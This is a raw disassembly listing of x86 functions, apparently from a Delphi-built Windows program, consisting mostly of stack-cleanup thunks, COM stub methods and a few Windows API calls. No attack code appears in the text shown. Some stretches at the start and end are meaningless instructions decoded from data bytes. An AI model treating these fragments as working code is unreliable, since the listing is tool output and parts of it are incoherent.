add [ edx - 0x54f3d000 ] ch
or [ ecx ] 0xbf327bf8
sbb dl [ eax ]
mov edi [ ebx + 0x3000aa00 ]
or al 0xab
sub_47373c
push ebx
mov ebx eax
mov eax ebx
call sub_472d88
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
pop ebx
retn
sub_473784
retn
sub_473886
jmp sub_403b24
sub_4739d8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
pop ebx
retn
sub_473a2e
jmp sub_403b24
sub_473a35
pop ecx
pop ebp
retn
sub_473a96
jmp sub_403b24
sub_473a9d
pop ecx
pop ebp
retn
sub_473aa0
retn
sub_473b5b
jmp sub_403b24
sub_473b62
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_473bb7
jmp sub_403b24
sub_473bbe
pop ebx
pop ecx
pop ebp
retn 0x4
sub_473c03
jmp sub_403b24
sub_473c0a
pop ebx
pop ecx
pop ebp
retn 0x4
sub_473d00
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
retn
push ecx
push edx
push eax
call [ rw-data ]
retn
sub_473da3
jmp sub_403b24
sub_473daa
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_473e09
jmp sub_403b24
sub_473e10
pop ebp
retn
sub_473e14
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
push eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_429d8c
call sub_473c10
sub_473e39
add [ esp + 0x4 ] 0xfffffff8
jmp sub_474828
sub_473e43
add [ esp + 0x4 ] 0xfffffff8
jmp sub_474838
sub_473e4d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_47484c
sub_473e57
add [ esp + 0x4 ] 0xfffffff8
jmp sub_474858
sub_473e61
add [ esp + 0x4 ] 0xfffffff8
jmp sub_474798
sub_473e75
add [ esp + 0x4 ] 0xfffffff8
jmp sub_474814
sub_4744ac
retn 0x4743
sub_4746ca
jmp sub_403b24
sub_4746d1
pop ebx
pop ecx
pop ebp
retn
sub_474735
jmp sub_403b24
sub_47473c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_474774
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_474814
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_4768dc
pop ebp
retn 0x4
sub_474828
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_474838
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_47484c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
j_sub_403870#6
jmp sub_403870
j_sub_403870#5
jmp sub_403870
sub_474e6c
jmp sub_403b24
sub_474e73
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47502e
jmp sub_403b24
sub_475035
mov esp ebp
pop ebp
retn
sub_4750f1
jmp sub_403870
sub_47511e
jmp sub_403b24
sub_475125
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_475251
jmp sub_403870
sub_475256
call sub_403bd8
pop edi
pop esi
pop ebx
pop ebp
retn
j_sub_40399c#6
jmp sub_40399c
sub_4753d4
push ebx
mov ebx eax
mov eax [ ebx + 0x214 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x214 ] eax
sub_475504
add esp 0xfffffff0
mov ecx esp
call sub_475538
mov ax [ esp + 0x8 ]
add esp 0x10
retn
sub_4755ba
jmp sub_403b24
sub_4755c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475616
jmp sub_403b24
sub_47561d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403870#4
jmp sub_403870
j_sub_403870#3
jmp sub_403870
sub_47596e
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_466be8
call sub_403bd8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47598c
retn
sub_475add
jmp sub_403b24
sub_475ae4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_475aee
jmp sub_403870
sub_475af3
mov eax [ ebp - 0x4 ]
call sub_4753d4
call sub_403bd8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_475bb0
call sub_475bd0
retn
sub_475bb8
add esp 0xfffffff0
mov [ esp ] 0x9
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_475ea0
add esp 0x10
retn
sub_475bd0
add esp 0xfffffff0
mov [ esp ] 0x3
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_475ea0
add esp 0x10
retn
sub_475c8e
jmp sub_403b24
sub_475c95
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_475c9c
add esp 0xfffffff0
mov [ esp ] 0xb
test cx cx
je r-xdata
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x8 ] 0xffff
jmp r-xdata
mov ecx esp
call sub_475ea0
add esp 0x10
retn
sub_475cc8
call sub_475ea0
retn
j_sub_403870#2
jmp sub_403870
sub_475da0
jmp sub_403b24
sub_475da7
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_475e75
jmp sub_403b24
sub_475e92
jmp sub_403b24
sub_475e99
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475f47
jmp sub_403b24
sub_475f4e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475fa8
jmp sub_403b24
sub_475faf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476056
jmp sub_403b24
sub_47605d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403870
jmp sub_403870
sub_476244
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_466be8
call sub_403bd8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4763e4
jmp sub_403b24
sub_4763eb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47640e
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_4753d4
sub_476407
jmp sub_403b24
j_sub_40399c#2
jmp sub_40399c
sub_4765b5
jmp sub_403b24
sub_47663f
jmp sub_403b24
sub_476724
jmp sub_403b24
sub_476741
jmp sub_403b24
sub_476748
mov esp ebp
pop ebp
retn
sub_4768c4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_4768dc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_4768f4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_476900
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x10
xor edx edx
mov [ eax ] edx
sub_476918
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004002
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_476930
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_47563c
xor eax eax
pop ebp
retn 0x4
sub_476944
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4769f4
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x4
sub_476ac4
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0xc
sub_476b20
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_476c6c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x230 ]
call sub_405b50
lea eax [ ebx + 0x22c ]
call sub_405b50
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_476cf4
push ebp
mov ebp esp
mov eax 0x800401a1
pop ebp
retn 0x8
sub_476d24
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_44d5b8
mov edx [ ebp + 0xc ]
mov [ edx ] eax
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_476de0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_476dec
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_476df8
push ebp
mov ebp esp
mov eax 0x1
pop ebp
retn 0xc
sub_476e28
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_476ed1
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x8 ]
call sub_474754
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f94c
jmp sub_476fa2
sub_476f19
mov eax ebx
mov edx [ esi + 0x68 ]
mov edx [ edx + 0x18 ]
mov cl 0xfc
call sub_413a2c
jmp sub_476fa2
sub_476f2a
call GetUserDefaultLCID
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_413a2c
jmp sub_476fa2
sub_476f3c
mov eax ebx
mov dl 0x1
call sub_413bfc
jmp sub_476fa2
sub_476f47
mov eax ebx
test [ esi + 0x1c ] 0x10
setne dl
xor dl 0x1
call sub_413bfc
jmp sub_476fa2
sub_476f5a
mov eax ebx
test [ esi + 0x1c ] 0x10
setne dl
call sub_413bfc
jmp sub_476fa2
sub_476f6a
mov eax ebx
xor edx edx
call sub_413bfc
jmp sub_476fa2
sub_476f75
mov eax ebx
xor edx edx
call sub_413bfc
jmp sub_476fa2
sub_476f80
mov eax ebx
mov dl 0x1
call sub_413bfc
jmp sub_476fa2
sub_476f8b
mov eax ebx
mov dl 0x1
call sub_413bfc
jmp sub_476fa2
sub_476fa2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476fca
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bd4
retn
sub_476fc3
jmp sub_403b24
sub_476fca
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_477078
jmp sub_403b24
sub_4770db
jmp sub_403b24
sub_477140
jmp sub_403b24
sub_47719d
jmp sub_403b24
j_sub_40399c
jmp sub_40399c
sub_4771dc
jmp sub_403b24
sub_4771e3
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4771f0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4771fc
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_477208
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_477245
jmp sub_403b24
sub_47724c
pop ebp
retn
sub_477298
jmp sub_403b24
sub_47729f
pop ebp
retn
sub_4772c9
jmp sub_403b24
sub_4772d0
pop ebp
retn
sub_4772d4
sub [ rw-data ] 0x1
retn
sub_477339
jmp sub_403b24
sub_477340
pop ebp
retn
sub_477344
sub [ rw-data ] 0x1
retn
sub_477390
retn
sub_477391
jmp sub_403b24
j_sub_477390
jmp sub_477390
sub_477398
pop ebp
retn
sub_47739c
sub [ rw-data ] 0x1
retn
sub_47765c
add eax 0x4
call sub_477624
retn
sub_477828
push ebx
mov ebx eax
mov dx [ ebx + 0x6 ]
mov ax [ ebx + 0x4 ]
call sub_4772dc
movzx eax ax
pop ebx
retn
sub_47796c
add esp 0xfffffff8
add eax 0x4
call sub_477fcc
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
retn
sub_477b14
mov [ eax + 0x8 ] dx
retn
sub_477b1c
mov [ eax + 0x10 ] edx
retn
sub_477b20
mov [ eax + 0xa ] dx
retn
sub_477b28
mov [ eax + 0xc ] dx
retn
sub_477b30
mov [ eax + 0x6 ] dx
retn
sub_477b38
mov [ eax + 0xe ] dx
retn
sub_477b40
mov [ eax + 0x4 ] dx
retn
sub_477b48
mov [ edx ] 0x0
lea eax [ edx + 0x8 ]
call sub_40d7a0
retn
sub_477c2e
jmp sub_403b24
sub_477c5b
jmp sub_403b24
sub_477c62
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477c7f
lea eax [ ebp - 0x2c ]
call sub_404120
retn
sub_477c78
jmp sub_403b24
sub_477c7f
pop ebx
mov esp ebp
pop ebp
retn
sub_477d64
jmp sub_403b24
sub_477d9b
jmp sub_403b24
sub_477da2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_477df8
mov eax [ edx + 0x8 ]
retn
sub_477f75
jmp sub_403b24
sub_477f7c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478150
jmp sub_403b24
sub_478157
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_478191
jmp sub_403b24
sub_478198
pop ebp
retn
sub_47819c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_415cb4
mov [ rw-data ] eax
sub_4784c8
jmp sub_403b24
sub_4784cf
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4784d8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
pop ebx
retn
sub_4784f0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
pop ebx
retn
sub_478530
add edx 0x4
call sub_478508
retn
sub_478564
add edx 0x4
call sub_47853c
retn
sub_4785c8
push ebx
push esi
mov esi edx
mov ebx eax
lea edx [ esi + 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_47ad98
inc eax
pop esi
pop ebx
retn
sub_47863d
jmp sub_403b24
sub_478644
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_47868d
jmp sub_403b24
sub_478694
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_47869c
push ebx
mov ebx eax
mov eax ebx
call sub_47864c
pop ebx
retn
sub_4786a8
add esp 0xfffffff8
mov edx esp
add eax 0x4
call sub_47b6c8
fild [ esp ]
pop ecx
pop edx
retn
sub_478744
jmp sub_403b24
sub_47874b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4787ae
jmp sub_403b24
sub_4787b5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4787bc
movsx edx dx
call sub_478754
retn
sub_4787c8
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
add eax 0x4
mov ecx 0x4
mov edx 0x20
call sub_47b63c
pop ebp
retn 0x8
sub_4788d0
jmp sub_403b24
sub_47897f
jmp sub_403b24
sub_4789e4
mov [ edx ] 0x0
lea eax [ edx + 0x8 ]
call sub_40d7a0
retn
sub_478ad4
jmp sub_403b24
sub_478b01
jmp sub_403b24
sub_478b08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478b25
lea eax [ ebp - 0x2c ]
call sub_404120
retn
sub_478b1e
jmp sub_403b24
sub_478b25
pop ebx
mov esp ebp
pop ebp
retn
sub_478c0f
jmp sub_403b24
sub_478c46
jmp sub_403b24
sub_478c4d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_478cf8
mov eax [ edx + 0x8 ]
retn
sub_478d6a
jmp sub_403b24
sub_478d71
pop ebx
pop ecx
pop ebp
retn
sub_478dc0
jmp sub_403b24
sub_478dc7
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_478eee
jmp sub_403b24
sub_478ef5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478fea
jmp sub_403b24
sub_478ff1
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_479190
jmp sub_403b24
sub_479197
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_479397
jmp sub_403b24
sub_47939e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47959e
jmp sub_403b24
sub_4795a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403b24#9
jmp sub_403b24
sub_4797a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479ac8
jmp sub_403b24
sub_479acf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479c9d
jmp sub_403b24
sub_479ca4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_479e41
jmp sub_403b24
sub_479e48
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47a0bb
jmp sub_403b24
sub_47a0c2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403b24#8
jmp sub_403b24
sub_47a258
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47a348
jmp sub_403b24
sub_47a34f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47a775
jmp sub_403b24
sub_47a77c
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47af85
jmp sub_403b24
sub_47af8c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403b24#7
jmp sub_403b24
sub_47aff7
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47b136
jmp sub_403b24
sub_47b13d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b1ac
jmp sub_403b24
sub_47b1b3
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47b493
jmp sub_403b24
sub_47b5eb
jmp sub_403b24
sub_47b5f2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b630
mov al [ eax + 0x1 ]
and al 0x3f
and eax 0xff
retn
sub_47b791
jmp sub_403b24
sub_47b798
pop ebp
retn
sub_47b79c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_415cb4
mov [ rw-data ] eax
sub_47ba8d
add eax 0xffffffec
jmp r-xdata
retn
sub_47ba95
add eax 0xffffffec
jmp sub_47bbf0
sub_47baa7
add [ esp + 0x4 ] 0xffffffec
jmp sub_405c24
sub_47babb
add eax 0xffffffe8
jmp r-xdata
mov al [ eax + 0xc ]
retn
sub_47bac3
add eax 0xffffffe8
jmp r-xdata
mov [ eax + 0xc ] dl
retn
sub_47bad5
add [ esp + 0x4 ] 0xffffffe8
jmp sub_405c24
sub_47bbf0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_404174
pop esi
pop ebx
retn
sub_47bc54
jmp sub_403b24
sub_47bc5b
pop ebp
retn
j_sub_403b24#6
jmp sub_403b24
sub_47bcc8
pop ebp
retn
sub_47bd10
retn
sub_47bd11
jmp sub_403b24
j_sub_47bd10
jmp sub_47bd10
sub_47bd18
pop ebp
retn
sub_47bd1c
sub [ rw-data ] 0x1
retn
sub_47bdac
sub [ rw-data ] 0x1
retn
sub_47c0da
jmp sub_403b24
sub_47c0e1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c103
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404144
retn
sub_47c0fc
jmp sub_403b24
sub_47c103
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c20a
jmp sub_403b24
sub_47c211
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c233
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404144
retn
sub_47c22c
jmp sub_403b24
sub_47c233
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
j_sub_403b24#5
jmp sub_403b24
sub_47c3cb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c3f5
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_47c3ee
jmp sub_403b24
sub_47c3f5
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c448
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_464ad0
retn
sub_47c47d
jmp sub_403b24
sub_47c484
pop ebp
retn
sub_47c7c7
jmp sub_403b24
sub_47c7ce
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47c852
jmp sub_403b24
sub_47c859
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47c8cb
jmp sub_403b24
sub_47c8d2
pop ebx
pop ecx
pop ebp
retn
j_sub_403b24#4
jmp sub_403b24
sub_47c943
pop ebx
pop ecx
pop ebp
retn
sub_47c948
push ebx
mov ebx eax
mov eax [ ebx + 0x318 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax [ ebx + 0x2fc ]
mov edx [ eax ]
call [ edx + 0xc4 ]
pop ebx
retn
sub_47c9b0
jmp sub_403b24
sub_47c9b7
pop ebx
pop ecx
pop ebp
retn
sub_47c9ec
jmp sub_403b24
sub_47c9f3
pop ebp
retn
sub_47c9f8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov [ eax ] r-xdata
sub_47ca11
add eax 0xfffffff4
jmp sub_47cb70
sub_47ca19
add eax 0xfffffff4
jmp sub_47cb84
sub_47ca21
add eax 0xfffffff4
jmp sub_47cbd4
sub_47ca33
add [ esp + 0x4 ] 0xfffffff4
jmp sub_405c24
sub_47ca4f
add eax 0xfffffff0
jmp sub_47cb94
sub_47ca61
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405c24
sub_47ca76
sub edx ecx
inc edi
add [ ebx ] dh
0x47
sub_47ca7e
cmp eax 0x110047ca
0x47
sub_47ca86
sbb edx ecx
inc edi
add [ ecx ] ah
0x47
sub_47ca8e
push edi
0x47
sub_47ca92
popad
0x47
sub_47cad3
0x47
sub_47cb70
push ebx
mov ebx edx
mov edx ebx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4665fc
pop ebx
retn
sub_47cb84
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46693c
retn
sub_47cbd4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466648
retn
j_sub_403b24#3
jmp sub_403b24
sub_47d1d1
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47d1fd
jmp sub_403b24
sub_47d204
pop ebp
retn
sub_47d208
sub [ rw-data ] 0x1
retn
sub_47d525
jmp sub_403b24
sub_47d52c
pop ebp
retn
sub_47d8e1
push 0x0
call RegCloseKey
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d8fd
retn
j_sub_403b24#2
jmp sub_403b24
sub_47d8fd
pop edi
pop esi
pop ebx
pop ebp
retn
sub_47d95e
retn
j_sub_403b24
jmp sub_403b24
j_sub_47d95e
jmp sub_47d95e
sub_47d966
pop ebp
retn
sub_47db9c
fadd st1
inc esi
add [ eax + 0x600046c3 ] dl
retn
sub_47dba6
inc esi
add al cl
retn
sub_47dbaa
inc esi
add [ eax + 0x46c3 ] bl
lds eax [ esi ]
rol ah 0x1
inc esi
add al cl
lds eax [ esi ]
cwde
lds eax [ esi ]
dec eax
hlt
